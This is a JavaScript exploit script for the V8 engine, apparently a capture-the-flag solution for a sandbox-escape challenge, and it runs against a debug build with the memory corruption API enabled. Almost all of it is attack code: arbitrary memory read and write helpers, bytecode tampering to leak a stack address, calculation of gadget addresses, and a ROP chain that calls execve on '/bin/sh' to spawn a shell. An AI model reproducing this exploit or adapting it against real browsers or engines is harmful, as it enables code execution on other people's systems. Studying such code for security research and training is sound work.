// v8_enable_sandbox = true
// v8_expose_memory_corruption_api = true
// v8_code_pointer_sandboxing = true
// v8_jitless = true

var conversion_buffer = new ArrayBuffer(8);
var f64_v = new Float64Array(conversion_buffer);
var u64_v = new BigUint64Array(conversion_buffer);

BigInt.prototype.hex = function () { return "0x"+this.toString(16); };
Number.prototype.hex = function () { return "0x"+this.toString(16); };
BigInt.prototype.i2f = function () { u64_v[0] = this; return f64_v[0]; };
Number.prototype.f2i = function () { f64_v[0] = this; return u64_v[0]; };

addrof = (obj) => Sandbox.getAddressOf(obj);
var smv = new Sandbox.MemoryView(0, 0xfffffff8);
var dv = new DataView(smv);

aar1 = (of) => { return dv.getUint8(of, true) };
aar4 = (of) => { return dv.getUint32(of, true) };
aar8 = (of) => { return dv.getBigUint64(of, true) };

aaw1 = (of, v) => { return dv.setUint8(of, v, true) };
aaw4 = (of, v) => { return dv.setUint32(of, v, true) };
aaw8 = (of, v) => { return dv.setBigUint64(of, v, true) };

hax = (a, b) => { return a + b + 1 };

var cage_base = aar8(24) - 0x60n;
console.log('cage_base: ', cage_base.hex());

// compile function first
hax();

// locate bytecode address
var addr_hax_shared_info = aar4(addrof(hax)+0xc) - 1;
//console.log(addr_hax_shared_info.hex());
var addr_hax_bytecode = aar4(addr_hax_shared_info + 4) - 1;
//console.log(addr_hax_bytecode.hex());
var ldar_idx = aar1(addr_hax_bytecode+0x21);
//console.log(ldar_idx.hex());
//console.log(addr_hax_shared_info.hex());
console.assert(ldar_idx == 4);

// edit bytecode: ldar argX
aaw1(addr_hax_bytecode+0x21, 17);

// leak value from stack (leak value must be even number or fail)
var leak = (hax(0, 0) - 1) << 1;
var pie = leak - 0xe5481c;
pie += 0x55b100000000; // 1/256
//pie += 0x555500000000;

console.log('pie: ', pie.hex());
var syscall = pie + 0x0114ccd3;
var rax = pie + 0x0109a135;
var rdx = pie + 0x00d9c832;
var rsi = pie + 0x00dc5a6e;
var rdi = pie + 0x011bb4eb;
console.log('rax: ', rax.hex());

// edit bytecode: ldar arg1 --> star to idx0 (= rbp) --> ret
aaw1(addr_hax_bytecode+0x21, 3);
aaw1(addr_hax_bytecode+0x22, 0x18);
aaw1(addr_hax_bytecode+0x23, 0);
aaw1(addr_hax_bytecode+0x24, 0xaa);

// forge bytecode, addr, ip
var fake = 0x111500;
aaw1(fake, 0xaa);

var obj = {};
var addr_obj = addrof(obj);

aaw8(addr_obj-0x28, 0x0n);
aaw8(addr_obj-0x20, (cage_base+BigInt(fake)) << 8n);
aaw8(addr_obj-0x18, 0x0n);
aaw8(addr_obj-0x10, 0x0n);

// place rop
aaw8(addr_obj+0x08+1, BigInt(rax) );
// 
aaw8(addr_obj+0x18+1, BigInt(rax) );
aaw8(addr_obj+0x20+1, BigInt(0x3b) );
aaw8(addr_obj+0x28+1, BigInt(rdx) );
aaw8(addr_obj+0x30+1, BigInt(0) );
aaw8(addr_obj+0x38+1, BigInt(rsi) );
aaw8(addr_obj+0x40+1, BigInt(0) );
aaw8(addr_obj+0x48+1, BigInt(rdi) );
aaw8(addr_obj+0x50+1, cage_base + BigInt(addr_obj+0x70) );
aaw8(addr_obj+0x58+1, BigInt(syscall) );
aaw8(addr_obj+0x70, 0x68732f6e69622fn );

// trigger 
console.log('call hax');
hax(obj);

